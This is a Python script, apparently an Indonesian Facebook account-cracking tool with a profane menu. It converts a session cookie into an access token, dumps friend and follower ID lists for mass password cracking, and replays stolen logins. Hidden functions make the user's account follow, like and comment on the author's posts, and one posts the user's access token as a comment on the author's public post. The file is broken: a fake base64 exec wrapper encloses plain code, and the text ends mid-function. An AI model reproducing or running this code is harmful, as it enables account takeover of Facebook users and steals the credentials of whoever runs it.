import base64
exec(base64.b64decode("#!/usr/bin/python
# -*- coding: utf-8 -*-
# ------ [ Gausah Dioprek Ntar Error ] ------ #
Author    = 'VRELL'
Facebook  = 'facebook.com/100063551252375'
Syafii  = 100063551252375
Postingan = 440758924719146
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
##### >>>> IMPORT MODULE
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
##### BUAT WARNA >>>> X
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[1;95m"     # Ungu
I = "\x1b[1;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
##### BUAT IMPORT YG BELUM INSTALL AHAHHAA
try:
	import requests
except ImportError:
	print(f"{H} ")
	print(f"{H}[*]{M} Module requests belum terinstall")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print(f"{H} ")
	print(f"{H}[*]{M} Module bs4 belum terinstall")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print(f"{H} ")
	print(f"{H}[*]{M} Module futures belum terinstall")
	os.system("pip install futures")
host = ("https://mbasic.facebook.com")
B = random.choice([H,U,J,K])
# Proses data
os.system('clear')
suradadi = ["[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==B==]", "[=E===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==B==]", "[=E===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==K==]", "[=I===]", "[R====]", "\x1b[0;92m[CYBER]","[Y=====]","[=B===]", "[==E==]", "[===R=]", "[====C]", "[===Y=]", "[==B==]", "[=E===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==K==]", "[=I===]", "[R====]", "\x1b[0;92m[CYBER]","[Y=====]","[=B===]", "[==E==]", "[===R=]", "[====C]", "[===Y=]", "[==B==]", "[=E===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===O=]", "[====D]", "[===O=]", "[==K==]", "[=I===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[==E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===O=]", "[==K==]", "[=I===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===O=]", "[====D]", "[===O=]", "[==K==]", "[=I===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=E===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===R=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=I===]", "[R====]", "\x1b[0;92m[CYBER]","[R=====]","[=B===]", "[==E==]", "[===R=]", "[====C]", "[===Y=]", "[==B==]", "[=E===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]","[C=====]","[=Y===]", "[==B==]", "[===E=]", "[====R]", "[===C=]", "[==Y==]", "[=B===]", "[R====]", "\x1b[0;92m[CYBER]"]
for i in range(len(suradadi)):
    time.sleep(0.0423)
    sys.stdout.write("\r\33[1;96mBOT CYBER CRACK \33[1;96mBY : \033[92mIMIN CYBER XD\x1b[0;36m "+ random.choice(['\x1b[0;33m', '\x1b[0;36m', '\x1b[0;35m', '\x1b[0;36m', '\x1b[0;35m']) + suradadi[i % len(suradadi)])
    sys.stdout.flush()
os.system("clear")

# BANNER
#### BUAT BANNER
def banner():
    war_dom = random.choice([P,K,B,J,U,H])
    print("""
\33[1;96m*&&&   &&&&&&     &&&&&&    &&&    &&&&&&    &&&\033[1;32m
 &&&   &&&&&&     &&&&&&    &&&    &&&&&&&   &&&
 &&&   &&& &&&   &&& &&&    &&&    &&&  &&&  &&&
 &&&   &&&  &&& &&&  &&&    &&&    &&&   &&& &&&
 &&&   &&&   &&&&&   &&&    &&&    &&&    &&&&&&
 &&&   &&&    &&&    &&&    &&&    &&&     &&&&&
 &&&   &&&           &&&    &&&    &&&&     &&&&
\33[1;96m&&&&& &&&&&&&       &&&&&& &&&&&& &&&&&&&    &&&\033[1;32m
_________________________________________________________

  NEW SCRIPT   : \33[1;96mEDITION LIMITED\033[1;32m

  FACEBOOK     : \33[1;96mIMIN CYBER XD\033[1;32m
\033[1;32m__________________________________________________________

 \33[1;96m☆☆ \033[1;32mSELAMAT DATANG KONTOL SILAHKAN PILIH MENU COLI NYA \33[1;96m☆☆\033[1;32m""")
 
###----------[ TIME ]---------- ###
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Ma7ret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

##### BUAT STR /LEN
id = []
ok = []
cp = []
loop=0

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

### BUAT ANIMASI JALAN
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Script loe keren bang'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

###----------[ CREATE FOLDER ]---------- ###
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Delete Cookies
    try:os.remove('login/cookie.json')
    except:pass
    # Delete Token
    try:os.remove('login/token.json')
    except:pass
###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            # id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id)
    except Exception as e:return(username)
    
###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print(f"{P}[+] Terjadi Kesalahan !")
    print(f"{P}[+] Tidak Dapat Mengeksekusi"(error))
    print(f"{P}[+] Hal Ini Mungkin Terjadi : ")
    print(f"{P}[01] Cookies/Token Invalid")
    print(f"{P}[02] Salah Memasukkan ID")
    print(f"{P}[03] bug Pada Source Code")
    print(f"{P}[04] Bug Pada Requests")
    print(f"{P}[05] Dan Lain-Lain")
    print(f"{P}[•] Jalankan Ulang Source Code Ini : ")
    print(f"{P}[•] python mbfv3.py")
    exit()

###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Syafii)];self.komen = ['Mantap Bang','Semangat Terus','Bang Jgn Lupa Istirahat nya','Jaga Ke Sehatan Bang Oke']
        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for x in bos.find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(___fii___Sayang___Kamu___Widiya___())
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Seorang Penjomblo Handal\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))
        
##### LOGIN TOKEN
def log_cookie():
    os.system("clear")
    banner()
    mkdir_data_login()
    print(f"{B} ")
    print(f"{K}[☆] 》AMBIL COOKIE ACCOUNT TUMBAL LOE DARI KIWIE YANG FREES KONTOL")
    print(f"{K}[☆] 》APABILA COOKIE EROR UBAH DULU PASSWORD ACCOUNT TUMBAL LOE MONYET")
    cookie=str(input(f"{H}[☆] 》MASUKAN COOKIE NYA NGENTOT : {B} "))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        bot_author(coki,token,cookie)
        open('login/token.json', 'w').write(token)
        open('login/cookie.json','w').write(cookie)
        menu()
    except requests.exceptions.ConnectionError:print(f"{H}[•] Tidak Ada Koneksi Internet ");exit()
    except (KeyError,IOError,AttributeError):print(f"{H}[•] Cookies Invalid ");exit()

komenredem = random.choice(['BANG JOBLO iYA :D'])
komtwol = random.choice(['ANJAY NGENT*T BANG IMIN GANTENG ', 'IMIN ', 'BANGB KOK LO JAGO BANGET SIH ', 'BANG DAH KAWIN BLUM NIH :D'])
kartu2d = random.choice(["LU GANTENG BANG TAPI SAYANG JOMBLO","AHAHAHAHHA BANG KAPAN KAWIN NYA NIH BANG :P"])
kon = random.choice(["CYBER  THE BEST :)"])
def ___fii___Sayang___Kamu___Widiya___():
    try:
        token = open('login/token.json', 'r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        kom = komenredem
        komentar = komtwol
        pipp = kartu2d
        post = '440758924719146'
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/440758924719146/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/440758924719146/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/440758924719146/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/440758924719146/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/440758924719146/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/440758924719146/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/440758924719146/likes?summary=true&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/440758924719146/likes?summary=true&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/440758924719146/likes?summary=true&access_token=' + (token),cookies=cookie)
        print(f'{I}[•] Login Berhasil Selamat Mengocok Ngentot :D')
        menu()
    except Exception as e:pass
  
###### BUAT MENU
def menu():
    global token,cookie
    try:
        token=open("login/token.json","r").read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        get = requests.get("https://graph.facebook.com/me?access_token=%s"%(token),cookies=cookie)
        gt = requests.get('http://ipinfo.io/json').json()
        language(cookie)
        lolo=json.loads(get.text)
        lolol=lolo['name']
        lolol_id=lolo['id']
        link = lolo['link']
    except (KeyError,IOError):
        print(f"{B} ")
        print(f"{B} ")
        jalan(f"{K}[!]{K} cookie failed.");log_cookie()
    os.system("clear");banner()
    print(f"{H}__________________________________________________________")
    jalan(f"{H}[1] CRACK NGOCOK PUBLIK")
    print(f"{H}[2] CRACK COLMEK COLI MASAL")
    print(f"{H}[3] CRACK DARI PERTEMANAN")
    print(f"{H}[4] CRACK DARI FOLLOWERS")
    print(f"{H}[5] GANTI USER AGENT TOL")
    print(f"{H}[6] CEK HASIL DARI NGENTOT")
    print(f"{H}[7] CEK OPSI AKUN CP COLI")
    jalan(f"{K}[0] KELUAR CROT/HAPUS COOKIE ")
    print(f"{B} ")
    pp = input(f"{H}[*] PILIH MENU : {I}")
    if pp in ["1","01"]:
      publik()
    elif pp in ["2","02"]:
        massal()
    elif pp in ["3","03"]:
        listteman()
    elif pp in ["4","04"]:
        followerss()
    elif pp in ["5","05"]:
        userset()
    elif pp in ["6","06"]:
        cek_results()
    elif pp in ["7","07"]:
        cek_hasil()
    elif pp in ["0","00"]:
        os.system("rm -rf login/token.json")
        os.system("rm -rf login/cookie.json");exit()
    else:print(f"{B} ");print(f"{K}[!]{M} Isi Yang Benar ");menu()

def massal():
    try:
        token=open("login/token.json","r").read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print(f"{B} ")
        print(f"{H}[•]{K} COOKIE KOID GANTI TUMBAL ");exit()
    try:
        print(f"{B} ")
        print(f"{H}[•] MASUKAN TOTAL ID YANG INGIN DI DUMP")
        tanya_total = int(input(f"{H}[•] MASUKAN JUMLAH : {I}"))
    except:tanya_total=1
    for t in range(tanya_total):
        t +=1
        _id_=input(f"{H}[•] MASUKAN USER ID  {H}{t} : {I}")
        try:
            url= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
            z=json.loads(url.text)
            for i in z['friends']['data']:
                uid = i["id"]
                nama = i["name"]
                id.append(uid+"<=>"+nama)
        except KeyError:
            print(f"{H}[•]{K} USER ID TIDAK PUBLIK");menu()
    if len(id) == 0:
       print(f"{H}[•]{K} TOTAL ID ANDA ADALAH {I}{len(id)}");exit()
    else:
        print(f"{H}[•] TOTAL ID : {I}{len(id)}")
        fii_xd()
##### CRACK PERTEMANAN 
def listteman():
    try:
        token=open("login/token.json","r").read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print(f"{H}[•]{M} COOKIE KOID GANTI TUMBAL ");exit()
    try:
        url= requests.get("https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s"%(token),cookies=cookie)
        z=json.loads(url.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        print(f"{H}[•] USER ID TIDAK PUBLIK");os.sys.menu()
    if len(id) !=0:
        print(f"{H}[•] TOTAL ID : {I}{len(id)}")
        fii_xd()
    else:print(f"{H}[•]{K} MAAF TOTAL ID ANDA : {I}{len(id)}");exit()
##### CRACK PUBLIK
def publik():
    try:
        token=open("login/token.json","r").read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print(f"{H}[•]{M} cookie modar dinggo wae ");exit()
    print(f"{B} ")
    _id_=input(f"{H}[•] Masukan user id : {I}")
    try:
        url= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
        z=json.loads(url.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        print(f"{B} ")
        print(f"{H}[•]{K} User id tidak di temukan atau akun tersebut privat ");menu()
    if len(id) !=0:
        print(f"{B} ")
        print(f"{H}[•] Total id : {I}{len(id)}")
        fii_xd()
    else:print(f"{H}[•] Total id : {I}{len(id)}");exit()
###### CRACK FOLLOWERS
def followerss():
    try:
        token=open("login/token.json","r").read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print(f"{B} ")
        print(f"{K}[•] cookie modar dinggo wae ");exit()
    print(f"{B} ")
    _id_=input(f"{H}[•] Masukan user id : {I}")
    try:
        for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(_id_,token),cookies=cookie).json()["data"]:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        print(f"{H}[•]{K} User id tidak di temukan atau id terdsebut privat ");menu()
    if len(id) !=0:
        print(f"{H}[•] Total id : {I}{len(id)}")
        fii_xd()
    else:print(f"{B}[•] {H} total id : {H}{len(id)}")


##### PENGGANTI USER - UA
def userset():
    print(f"{B} ")
    print(f"{H}[1] Ganti user agent")
    print(f"{H}[2] Cek user agent yang di gunakan")
    print(f"{H}[0] Kembali")
    print(f"{B} ")
    _pil_=input(f"{H}[•] Input : {I}")
    if _pil_ in ["1","01"]:
        print(f"{B} ")
        lololr=input(f"{H}[•] Masukan user agent \n{I}[•] Masukan di sini : {I}")
        try:
            open("ua","w").write(lololr)
            usera=open("ua","r").read()
        except Exception as e:
            print(f"{B} ")
            print(f"{B}[•] Eror : {K}{e}")
        if usera == lololr:
            print(f"{B} ")
            print(f"{H}[•] Sukses mengganti");menu()
        else:print(f"{H}[•]{I} Gagal mengganti user agent ");exit()
    
    elif _pil_ in ["2","02"]:
        try:
            _tes_ua=open("ua","r").read()
        except IOError:
            _tes_ua= "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11"
        print(f"{H}[•] User agent : {B}{_tes_ua}");menu()
    elif _pil_ in ["0","00"]:
        menu()
    else:print(f"{H}[•] Pilihan salah ");exit()

#####LOGIN HASIL
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print(f"{B} ")
        print(f"{K}[•] Akun terkena spam")
    if "c_user" in ses.cookies:
        print(f"{H}[•]{I} Akun berhasil di login")
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        tempek = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in tempek.find_all("option")]
        for opt in range(len(ngew)):
            print(f"{B} ")
            jalan(f"{U}[{B}{str(opt+1)}{U}]{P}--->{H}[{B}{ngew[opt]}{H}]")
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        print(f"{H}[•]{K}|╤►╤► {oh}")
    else:
        print(f"{H}[•]{K} Akun tersebut sandi nya telah di ganti")
def cek_hasil():
    print(f"{B} ")
    print(f"{B} ")
    print(f"{K}[•] Masukan file cp ")
    print(f"{H}[•] Contoh untuk masukan file : {K}CP/{tanggal}.json")
    print(f"{B} ")
    files =input(f"{H}[•] Masukan nama file : {I}")
    try:
        buka_baju = open(files,'r').readlines()
    except FileNotFoundError:
        print(f"{B} ")
        print(f"{H}[•]{M} File tidak di temukan");exit()
        time.sleep(2); cek_hasil()
    print(f"{B} ")
    print(f"{H}[•] Total akun chekpoint : {B}{str(len(buka_baju))}")
    print(f"{B} ")
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split(" ")
#        print(f"{B} ")
        print(f"{H}[•] Akun facebook : {I}{kontol}")
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print(f"{B} ")
    input(f"{H}[•]{I} Chek akun sudah selesai")
    menu()

def cek_results():
    try:
        open("OK/%s.json"%(tanggal))
    except IOError:
        os.system("touch OK/%s.json"%(tanggal))
    try:
        open("CP/%s.json"%(tanggal))
    except IOError:
        os.system("touch CP/%s.json"%(tanggal))
    cp=("CP/%s.json"%(tanggal))
    ok=("OK/%s.json"%(tanggal))
    hsl_cp=open(cp,"r").read()
    hsl_ok=open(ok,"r").read()
    print(f"{H}  ")
    print(f"{H} ")
    print(f"{K}[1] Cek results cp")
    print(f"{I}[2] Cek results ok")
    print(f"{H}[0] Back")
    print(f"{B} ")
    _pil3h=input(f"{P}[•] Pilih : {I}")
    if _pil3h in ["1","01"]:
        if len(hsl_cp) != 0:
            print(f"{H} ")
            print(f"{H}[•]{M} Results cp{I}")
            os.system("cat CP/%s.json"%(tanggal))
        else:print(f"{K}[•] Tidak ada hasil")
    elif _pil3h in ["2","02"]:
        if len(hsl_ok) != 0:
            print(f"{H} ")
            print(f"{H}[•]{I} Results ok")
            os.system("cat OK/%s.json"%(tanggal))
        else:print(f"\n{B}[•]{K} Tidak ada hasil")
    elif _pil3h in ["0","00"]:
        menu()
    else:print(f"{H}[•]{K} Pilian tidak ada")


def fii_xd():
	kone()
	print(f"{H} ")
	print(f"{H} ")
	fiisayangwidiya =input(f"{H}[•] Pilih : {I}")
	if fiisayangwidiya in [""]:
		print(f"{H} ")
